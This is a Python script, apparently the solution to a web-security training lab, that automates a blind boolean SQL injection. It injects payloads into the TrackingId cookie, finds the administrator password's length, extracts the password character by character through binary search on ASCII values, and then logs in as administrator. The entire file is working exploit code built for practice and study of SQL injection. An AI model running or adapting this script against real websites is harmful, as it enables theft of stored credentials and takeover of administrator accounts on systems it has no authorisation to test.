import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    login_url = url + path
    r = s.get(login_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, username, password):
    login_url = url + '/login'
    payload = {
        "csrf": get_csrf_token(s, url, '/login'),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers)

    if 'Log out' in r.text:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def _check_length_pass(s, url, path, username, base_id):
    target_url = url + path
    for i in range(0, 30):
        sql_injection = f"' AND (SELECT LENGTH(password) FROM users WHERE username = '{username}') = {i}--"
        cookies = { "TrackingId": base_id + sql_injection }
        r = s.get(target_url, cookies=cookies)
        print(f'[..] Is length password equal {i}')
        if "Welcome back!" in r.text:
            return i
    return None

def _try(s, url, path, username, idx, c, base_id):
    target_url = url + path
    sql_injection = f"' AND (SELECT ASCII(SUBSTRING(password, {idx}, 1)) FROM users WHERE username = '{username}') >= '{c}"
    cookies = { "TrackingId": base_id + sql_injection }
    r = s.get(target_url, cookies=cookies)
    if "Welcome back!" in r.text:
        return True
    return False

def bruteforce(s, url, path, username):
    base_id = s.cookies.get('TrackingId')
    if not base_id:
        print("[-] Error: Could not find 'TrackingId' in cookies.")
        sys.exit(-1)
    len_pass = _check_length_pass(s, url, path, username, base_id)
    if not len_pass:
        print('[-] Fail to get length of password')
        sys.exit(-1)
    else:
        print(f'[+] Password length equal {len_pass}')

    print('[+] Start bruteforce:')
    password = ""
    for i in range(1, len_pass + 1):
        l, r = 0, 256
        correct_char = ''
        flag = False

        while l <= r:
            mid = (l + r) // 2
            if _try(s, url, path, username, i, mid, base_id):
                correct_char = chr(mid)
                flag = True
                l = mid + 1
            else:
                r = mid - 1

        if flag:
            password += correct_char
        else:
            print(f'[-] Fail to find character in index {i}')
            sys.exit(-1)
        print(f'[..] Processing: {password}')
    
    print('[+] Finished')
    print(f"[+] Found password = {password}")
    return password

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    s.get(url)
    password = bruteforce(s, url, '/login', 'administrator')
    login_acc(s, url, 'administrator', password)
    check_solved_lab(s, url)


if __name__ == '__main__':
    main()